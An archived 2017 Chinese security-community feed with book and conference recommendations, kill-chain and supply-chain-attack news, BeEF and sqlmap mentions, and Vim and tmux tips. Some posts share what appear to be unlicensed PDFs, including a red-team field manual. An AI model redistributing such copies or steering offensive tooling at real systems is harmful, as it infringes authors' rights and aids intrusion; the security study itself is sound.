<img src="https://file.xiaomiquan.com/e9/6e/e96ec9869e5e0fef8e1719ca824de2f55535326cf3110773e449826b0e365a32.jpg" width="25px"/> __Coco413@ATToT__: 赞赞，如果需要看看pdf或者kindle版本的可以先下载看看，
[http://www.finelybook.com/gray-hat-c-a-hackers-guide-to-creating-and-automating-security-tools/](http://www.finelybook.com/gray-hat-c-a-hackers-guide-to-creating-and-automating-security-tools/)

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 一般适合做图形化界面给小白做哦

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-05:


__#资源#__

之前提到过这本书《灰帽 C#》，玩 C# 及 Win 渗透的同学，这本书很值得实践，也很值得入门，前提是：英文不是障碍。

由浅入深，一步步打造自己的利用工具，并和那些知名的黑客/安全工具联动。无论是攻还是防，这本书都很合适。

我好像在写书评...🤣


__分享文件:__

[No Starch Press Gray Hat Csharp B0721RCGMX.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/No%20Starch%20Press%20Gray%20Hat%20Csharp%20B0721RCGMX.pdf)


---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-12:

> 匿名用户 提问：
基因的那篇paper值得在这里分享么
[http://dnasec.cs.washington.edu/dnasec.pdf](http://dnasec.cs.washington.edu/dnasec.pdf)




如果有翻译那就好了。



...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 国内现在翻译的都是资讯，还不是 Paper


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-24:


__#HITB#__

HITB 新加坡这两天相关演讲议题都会在这公布：


[Index of /materials/sg2017](https://gsec.hitb.org/materials/sg2017/)

 

每个议题一结束就会公开 PPT，随时关注就好，

今天是演讲日第一天。

<img src="https://images.xiaomiquan.com/FvIrCzm9b5uy59nh7x_T6qqjaRAt?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:SnDVTuYEVMqM8iPYwqWW9e6D-Zc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 这两天的所有议题安排在这：

[Training   Conference Agenda « HITB GSEC – Singapo...](https://gsec.hitb.org/sg2017/agenda/)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-09-19:


__#资源#__

推荐 ES6 标准入门（第3版）

引用文中的介绍：

```
ECMAScript 6.0（以下简称 ES6）是 JavaScript 语言的下一代标准，已经在2015年6月正式发布了。它的目标，是使得 JavaScript 语言可以用来编写复杂的大型应用程序，成为企业级开发语言。

...

因此，ECMAScript 和 JavaScript 的关系是，前者是后者的规格，后者是前者的一种实现（另外的 ECMAScript 方言还有 Jscript 和 ActionScript）。日常场合，这两个词是可以互换的。
```

前端黑领域，要打好的基础有两个：HTML5 与 ES6。这本书阮一峰所著，他的文章向来很清晰，推荐给大家，更难得的是这本书如果不买纸质版也行，他免费开放到网上了：


[ECMAScript 6 入门 - ECMAScript 6入门](http://es6.ruanyifeng.com)


<img src="https://images.xiaomiquan.com/FhJgACL4XHwo4897zP8LWl9AxBey?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:lwWtpaOU2bu1KWCZlShEEhj-QqQ=" width="50%" height="50%" align="middle"/>


---

<img src="https://file.xiaomiquan.com/53/93/5393f85d981fdca80d89f411c1db56b464ad0512f3e49b0e88bfc2ce40916a62.jpg" width="25px"/> __RAY__ on 2017-09-26:

强烈推荐大家关注下Derbycon 2017，都是一群实战红蓝队技术的家伙，演讲议题硬货实在实在太多了，眼花缭乱~


[Derbycon 2017 Videos (Hacking Illustrated Series I...](http://www.irongeek.com/i.php?page=videos/derbycon7/mainlist)



<img src="https://file.xiaomiquan.com/d1/7b/d17ba0300f0fff865bcbfe8c94d1ad96ae9463fd7d80c1c38cc43dc670f83b4b.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/95/63/9563c9001173aff07340c06c833c1d20bf851f042f88d6522ef554d8cca69d76.png" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/31/0d/310da90b6e49ee958430a501391bf2b36c4afd88dded3e7aca6b1425013b7f1f.png" width="50%" height="50%" align="middle"/>

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-10-24:


__#资源#__

推荐安全客季刊第三期

内容包含：软件安全、BlackHat、漏洞分析、木马分析、安全研究、安全运营。

511 页不是件简单的事。


__分享文件:__

[security-geek-2017-q3.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/security-geek-2017-q3.pdf)


---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-10-28:

周末来一发 红队手册~


__分享文件:__

[rtfm-red-team-field-manual.pdf](https://github.com/ChrisLinn/greyhame-2017/tree/master/shared-files/rtfm-red-team-field-manual.pdf)


...

<img src="https://file.xiaomiquan.com/31/b6/31b6586a32515d09f2da0a1509c60c36213c8568619e11232e37c85ad4fb675b.jpg" width="25px"/> __天行者__: 道客巴巴上有在线版（134页）

[RTFM Red Team Field Manual - 其它资料 - 道客巴巴](http://www.doc88.com/p-4109036491534.html)




...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-11-22:


__#经验#__

  我知道大多数人很懒，但是这本书确实是真经典。

《UNIX 编程艺术》

我不止一次传播过它的思想，这本书对我的黑客工程化之路影响巨大。

拍几页供细细品味其中哲学。


<img src="https://file.xiaomiquan.com/120/48/2048831f241fcdb26fa8207f1c598cc20b06b6b5e50c708c6667cc966e60e90b_big.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/16f/99/6f99cbbebdebd0e2ed10522d9496c003c52bdb8ec9f05deee096a65578d240d1_big.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1e1/61/e161ce9fdeee38038c00c27a17a1c851143e7421e5ce619747f671747c3f0afc_big.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1b3/c4/b3c484020ec240ebd9d2d69c1073587e8133a0aab4ca51dc2a5d9a173f78bd2b_big.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1b6/c4/b6c4c422d23f10d5b0fa3fa99ace30794f4d0ae8b0d3406d2ef6738c0f7f5f41_big.jpg" width="50%" height="50%" align="middle"/>

<img src="https://file.xiaomiquan.com/1bc/cf/bccff0b4917c2cec538d21085b92b9145c03f70f40a097d51567132c6aa73f92_big.jpg" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/09/17/09173a8ddd903516f16515893f44703fd4de9ec901a54ac5deeccfe9db189fdd.jpg" width="25px"/> __BigBoy__: 最后一页没看明白[憨笑]

<img src="https://file.xiaomiquan.com/23/09/23091c17d1fee9990569279ef5daed0ec260736405e8e9a9619dcb084a4d09d8.jpg" width="25px"/> __小后__: 读书那会，以前有本中文的，直接被师傅扔掉，然后买了本英文的，师傅终于满意了


...

---


## APT

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-01:


__#科普#__

  落马七步杀

落马或洛马，全称“洛克希德马丁”，世界第一武器生产商，存活100多年了，在网络安全方面搞了个 APT 七步杀，指出 APT 攻击的七个经典步骤，细节见其官网：

[Cyber Kill Chain® · Lockheed Martin](http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html)

 

注：APT 全称高级持续性威胁，可以认为渗透测试最高级阶段就是 APT。

国内很多搞安服（安全服务），接触不到完整的七步杀过程，我之前所说的渗透测试指的正是这个。

所以，你觉得这条路难不难？

我们在防御上，也必须很懂这七步杀，否则如何对抗？

<img src="https://images.xiaomiquan.com/Fu7QRmclPRRTGwpFuH37Vm3P3z0X?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:QF9cNplS4ix0VbeSwVinS0UWFGc=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/bd/52/bd5240ef725ab07f77d1a8c67cdaa7f3ceac055d5eba1b2af0362c3e7fbc2a2f.jpg" width="25px"/> __Z.__: 就4和7能搞定。防御就只能这样子了。防御永远是在攻击之后的，如果想在主动攻击这方面还需要更多配合。“永恒之蓝”是最好的实验样本。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-08-25:


__#HITB#__

推荐《Threat Hunting 101: Become The Hunter》，如何成为威胁猎人。

顾名思义，就是能很好发现威胁的安全人员。

需要掌握攻击技巧、网络分析、恶意分析、内存分析、主机分析等能力。需要整合 Red Team 与 Blue Team 的双重身份与能力。

这篇 Paper 也提到了 Kill Chain（攻击链），不过和之前提的“洛马七步杀”有些不一样，他们（Contercept，这个团队最近在永恒之蓝的对抗上出了些名气）里面提的步骤包括：

1. Recon
2. Delivery
3. Exploit
4. C2
5. Privilege Escalation
6. Lateral Movement
7. Objective

展开提了红蓝对抗的这些点，作为参考很不错。


__分享文件:__

[COMMSEC D1 - Hamza Beghal - Threat Hunting 101 -  Become the Hunter.pdf](https://github.com/ChrisLinn/greyhame-2017/blob/master/shared-files/COMMSEC%20D1%20-%20Hamza%20Beghal%20-%20Threat%20Hunting%20101%20-%20%20Become%20the%20Hunter.pdf)


---

<img src="https://file.xiaomiquan.com/3e/75/3e7537bd2177c4dd5dd1b56e3c0042e0ff82aff34db92a1095cf97b73266c3ec.jpg" width="25px"/> __Aro_un@ATTOT__ on 2017-09-18:

ccleaner被植马，有安装对应版本的快速很新下。
[CCleaner, distributed by anti-virus firm Avast, co...](https://www.grahamcluley.com/ccleaner-backdoor/)



<img src="https://images.xiaomiquan.com/Fl2bm4eAlq_xoHvOh6tadAa8t_4Y?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:pml-gq9yfB0_giHCbAtwu4BPXhk=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 又震惊了……

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 供应链劫持

<img src="https://file.xiaomiquan.com/2e/d6/2ed601f524a093a2ef25692413f618bd2d947cde8075dc813b98205b2daef33d.jpg" width="25px"/> __据说好的名字很容易被别人记住__: 5.25版本

<img src="https://file.xiaomiquan.com/05/26/052606bee1b5e45844ab8e982107696c26c933506b311222774cbe70dda755c6.jpg" width="25px"/> __GeekaLeo__: ……懒得更新也能躲过一劫

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 最近供应链入侵有点多啊 难道是个趋势？不过，这种入侵的周期 成本以及能力 不是一般人和小团队能承受的。国家队是不是都准备上正面战场了啊…

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 小团队也可以承受，不过就看有没能力或运气去搞这一出


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-10-23:


__#资讯#__

 

今年供应链攻击似乎很热…
供应链攻击又一例：Mac 专用 Elmedia 播放器和下载管理器 Folx 最新版本感染 OSX.Proper 恶意软件
这次波及到了macos平台

链接:
[供应链攻击又一例：Mac 专用 Elmedia 播放器和下载管理器 Folx 最新版本感染 OSX....](http://hackernews.cc/archives/16085)


...

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__: 也是下血本 光远控成本就得几十W

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 看到Flox，立马对本机检测了一下  果断卸载


...

---

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ on 2017-12-14:


__#讨论#__ 

发个有意思的 不知道是不是路由劫持

[Popular Destinations rerouted to Russia | BGPmon](https://bgpmon.net/popular-destinations-rerouted-to-russia/)

BTW，群里貌似聊BGP的比较少 下次有机会专门聊一聊



...

<img src="https://file.zsxq.com/0a/bd/0abddfca718a9f30c1e29e53617f76be9cc86b9fe12b387e9899e75a3427aeec.jpg" width="25px"/> __豆@ATToT__: BGP的安全问题是某些国家获取情报的一大渠道

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __豆@ATToT__:   嗯 可惜国内研究BGP的并不多


...

---

## git


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-31:


__#姿势#__

 Git

Git 是极其优秀且普遍的分布式版本控制系统，是我们当下团队编码协作方面、代码版本控制方面必备的神器与操作流程。

刚刚发的神器 BeEF “详细安装过程” 里有个步骤就是 Git 的操作：

`git clone git://github.com/beefproject/beef.git`

如果我们只是去看别人的代码，git clone 这个克隆操作是最常用的，会这个就够了。

入门可以看这个，非常有意思的入门引导过程：

[Git Tutorial - Try Git](https://try.github.io/)



Git 官网可以看到安装过程：

[Git](https://git-scm.com/)



---



## Vim

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-27:


__#资源#__

  对很多入门同学来说，强烈建议熟练一款编辑器的操作：VIM

VIM 广泛存在于 Linux/Unix 世界，在 Win 上也有安装包，一些优秀的 IDE 也有 VIM 编辑模式。

当上手 VIM 后，你会发现这个世界脱离鼠标后，能这么的快。

其实入门很简单，只是需要适应一段时间，然后成为 VIM 党后，你就再也放不下它了。😏

唯一推荐下面这个入门到进阶的教程：


[简明 Vim 练级攻略 | | 酷 壳 - CoolShell](http://coolshell.cn/articles/5426.html)

 

完善练三遍先。

已经上手的点个赞吧！😬



...

<img src="https://file.xiaomiquan.com/ed/ae/edaeb7f47a4781139bf241a4392f0819e0e08baf1f54733609fc45911fe637bc.jpg" width="25px"/> __beyes__: 在windows上用的gVim。一些大的字典只有gVim能打开，格式也更好看，记事本根本动不了。

<img src="https://file.xiaomiquan.com/0e/48/0e48d9ee4e4299ba09ac5217c23e38ceeb13e48357ee2261c6c03282b5807781.jpg" width="25px"/> __Chen__: spf13 值得拥有

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 听说emacs也挺好，好像组合键比较强大

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 不用听说，是很好，但是VIM党和它水火不容，哈哈🤣

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 以前用过一段时间vim，不过现在用的是atom(vim模式)，为什么不直接用vim呢？大概也是因为一个“懒”字吧。。

<img src="https://file.xiaomiquan.com/39/af/39afdd4df15a1b5873d31128152362e51289b2b47f8246bd35f7ac3592194769.jpg" width="25px"/> __D0ll4r__: 我就是linux+vim党，非常方便，效率很高特别推荐。编程推荐用vscode+vim+py等插件，跨平台哈。😆😆😆


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-05-29:


__#资源#__

 上次提到了 VIM，不知道多少人上手了？

这里给个好玩的资源：
[VIM Adventures](https://vim-adventures.com/)



玩游戏熟悉 VIM。对游戏有天赋的同学可以试试。😁

<img src="https://images.xiaomiquan.com/FpRmw0anMktbZUBx1zabhEttZQbq?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:ZqUlisEfBjuc6PMVwlEMXRe5I7A=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/60/86/6086053624a622769110d3b2fa6f121993526bbb6c81d8ae8d316230c5bd4105.jpg" width="25px"/> __东方小白__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 建议推荐一下Linux系统自带的vimtutor，当年就是用这个入的门😁

<img src="https://file.xiaomiquan.com/ed/bc/edbc72dbd68de9dc5d8cb78143835bb17cc4a3660b9dd5e0c117f38ff1f28ade.jpg" width="25px"/> __SakuraLin__: hacknet这个游戏也很有趣。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:


__#工具#__

 之前推荐了两次 Vim 及相关资源，大家上手如何，有同学希望推荐更多 Vim 相关的。如果对原生 Vim 不满意的，可以看看这个 SpaceVim：
[https://spacevim.org/](https://spacevim.org/)



官网介绍：

SpaceVim is a community-driven vim distribution that seeks to provide layer feature, especially for neovim. It offers a variety of layers to choose from. to create a suitable vim development environment, you just need to select the required layers.

这是社区驱动的，目的是打造一个不错的 VIM 开发环境。如图界面，感受下，确实很吊。

除了这个，还可以了解下 NeoVim。

但，我还是喜欢最原生的操作方式，说个奇葩的，如果是在 Windows 环境下，我的编程是直接用 Notepad++，对我来说，只要代码高亮好，其他都是小问题。但我最重要的开发环境还是在 Linux 下，用的是 Vim，不安装任何插件。

每个人的习惯不一样，SpaceVim 和 NeoVim，值得大家去了解看看，说不定你会一发不可收拾。

记住：无论搞安全还是编程，首先你得有自己的一款高效率编辑器环境。这个是玩出来的，多玩多折腾不会错！

<img src="https://images.xiaomiquan.com/FkoyCRgP9BeCL3uIw5qoSJNE6JIl?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PhK0usi3xbyYBfTZbtOqsNASMWw=" width="50%" height="50%" align="middle"/>

<img src="https://images.xiaomiquan.com/FrcZwuYGx9kABFnN6FVAuKs-iBG6?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7eyi2EK37A1GsCP7zn_BGfyqbLk=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 看了余弦表哥的推荐我深受感触，然后入了emacs坑

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: ……

...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-10:

> 匿名用户 提问：
余弦，你好。可以分享一下你的.vimrc文件吗？如果可以的话

```
color koehler
syntax on
set nocompatible
set ruler
set number
set showcmd
set incsearch
set hlsearch
set nobk
set history=60
set shiftwidth=4
set softtabstop=4
set tabstop=4
set expandtab
set helplang=cn
set ttymouse=xterm2
set fileencodings=utf-8,ucs-bom,gb18030,gbk,gb2312,cp936
set termencoding=utf-8
set encoding=utf-8
```


...

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充说明下：我的一切习惯的宗旨是：极简主义，够用就好。所以我的 Vim 配置文件非常简单，我不会用任何插件来加速我的效率，因为我的效率已经够高。之前我还说过，我在 Win 下甚至系统用 Notepad++ 作为我的首选编辑器。不一定要学我的方式。

<img src="https://file.xiaomiquan.com/49/90/4990015a4b6cc0255dd2d9c160c50566417feed80276fbddfe3d4529b613771f.jpg" width="25px"/> __alan__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 适合自己的才是最好的😜


...

---

## tmux



<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-12:


__#姿势#__

 Linux 多终端神器 tmux

只要遇到谁在皱着眉头玩 Linux，我肯定就会问：“怎么没在 tmux 下操作？哪怕 screen 也行呀，你这样跑任务，万一网络断了，终端退出，任务不就死了？”

这句话往往会让不少人一头雾水，什么是 tmux？什么是 screen？这里不说 screen，说这个更强大的 tmux，玩会这个，你将拥有 Linux 下多终端快速操作技能，再也不用担心网络断了，导致当前任务死掉。

如果你在 Ubuntu 下，可以这样安装：

apt-get install tmux

想快速入门可以看这篇文章：


[http://blog.jobbole.com/87278/](http://blog.jobbole.com/87278/)



对了，这个命令在安全技能树里有列出，你发现了没？

<img src="https://images.xiaomiquan.com/FoF9HHeR_gXthlqlZLsj_QQxUSQ5?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:1-aYUGO5-lAGg43kIO2ZSoHin-Q=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: screen -S sqlmap
ctrl+A D睡觉去……
第二天：
screen -r sqlmap

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 试试 tmux，刚开始你会不习惯，习惯后可以扔掉 screen 了

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: iterm2 好用

<img src="https://file.xiaomiquan.com/62/e0/62e0ca0ecbd2f9e3df7f828c6bb04962f00dcf6418effa92cfe89ba557a51ace.jpg" width="25px"/> __yudan__: 在用，以前总是开一堆终端，一个写脚本一个测试脚本，遇上两个脚本的时候简直是地狱，自从用了tmux世界都光明了


<img src="https://file.xiaomiquan.com/06/80/0680db16c9c7b01e0339fde36284b22a6883bda247cdabb58ed9c92235fa2f3c.jpg" width="25px"/> __英雄马__: iterm2 好用

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/06/80/0680db16c9c7b01e0339fde36284b22a6883bda247cdabb58ed9c92235fa2f3c.jpg" width="25px"/> __英雄马__: 不是一个感觉

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 不是一个感觉

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 有空去感觉下

<img src="https://file.xiaomiquan.com/8f/79/8f79b2f9cc50f9c3cc4599fa4a3c2881fe5d4b680ae03889196bcb10ca21b285.jpg" width="25px"/> __吴文尉__: 踩过坑的我也来说一句，tmux和spf1配合用，会有一个背景色冲突的问题，一直没有找到解决方法，知道上次看到官方文档，需要加一个参数 -2

<img src="https://file.xiaomiquan.com/8f/79/8f79b2f9cc50f9c3cc4599fa4a3c2881fe5d4b680ae03889196bcb10ca21b285.jpg" width="25px"/> __吴文尉__: tmux和spf13结合，vim会出现背景色冲突的问题，解决方法就是加一个参数 －2，即可

<img src="https://file.xiaomiquan.com/d7/28/d7289088de0995b81a7ecd6139812dc6d6b566d02c617a019a4f69b80438a435.jpg" width="25px"/> __掌柜的__: 最喜欢ctrl+b "  %无论如何分成4个再说，另外同一个session做操作分享真的太好用了，通常搞不定的bug让基友远程调测，用tmux我就可以同步看，非常方便。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/d7/28/d7289088de0995b81a7ecd6139812dc6d6b566d02c617a019a4f69b80438a435.jpg" width="25px"/> __掌柜的__: 嗯 是的

<img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 突然发觉这篇文章校稿的是我朋友😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/66/01/660104bd6b28762521f973581f028cc6e49e98159b6d3614aa96a4d64ee52a33.jpg" width="25px"/> __(月半)Al3x~__: 巧呀


...

---

## shell


<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-07-11:


__#姿势#__

升级简陋的 Shell 到完美交互的 TTYs 终端
